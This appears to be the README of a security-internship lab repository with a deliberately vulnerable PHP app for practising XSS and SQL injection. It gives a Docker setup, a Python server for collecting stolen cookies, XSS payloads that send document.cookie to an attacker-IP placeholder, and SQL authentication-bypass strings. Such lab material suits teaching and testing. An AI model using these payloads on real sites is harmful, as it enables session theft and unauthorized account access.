# Vulnerable PHP Application - XSS and SQL Injection

Description

This repository gathers various tools and techniques utilized during a system security internship. It serves as an educational resource to demonstrate common web security vulnerabilities, including Cross-Site Scripting (XSS) and SQL Injection (SQLi). The repository provides a vulnerable PHP application where users can test and understand how these exploits work in a controlled environment.

Features

Hands-on demonstration of web vulnerabilities

Dockerized setup for easy deployment

Practical attack payloads for testing security weaknesses

---

This repository collects tools and methodologies used during a system security internship.

## Analyzed vulnerabilities
- **XSS (Cross-Site Scripting)**
  - Reflected
  - Stored
- **SQL Injection**

## Start the Vulnerable Lab
1. Install Docker for your operating system.
2. Clone or download this repository.
3. Start Docker.
4. Open a command prompt inside the project root directory and execute the following command:
   ```sh
   docker compose up --build
   ```

## Start the Attacker Web Server
To collect stolen cookies, a simple HTTP server is used. Launch it using:
```sh
python -m http.server 8000
```

XSS Attack Payloads

Reflected Cross-Site Scripting (XSS)

This script forces the victim’s browser to send their cookies to an attacker-controlled server:

<script>window.location.replace("http://<attackerIP>:8000/a.html?c=" + document.cookie);</script>

Stored Cross-Site Scripting (XSS)

This method, although noisy, continuously triggers requests by injecting a malicious image tag:
<img src="invalid" onerror=this.src='http://<attackerIP>:8000/' + document.cookie; />

For a more discreet approach use this:
```html
<script>i=document.createElement('img');i.src='http://<attackerIP>:8000/'+document.cookie;document.body.appendChild(i)</script>
```

Basic alert test:
```html
<script>alert(document.cookie)</script>
```

### SQLi Payloads
To gain access to the first account saved in the database:
```sql
' OR 1=1 --
```

To gain access to an account by knowing the username:
```sql
[username]' OR 1=1 --
```

Bypassing authentication using ID-based query:
```sql
id = 100 OR 1=1
```

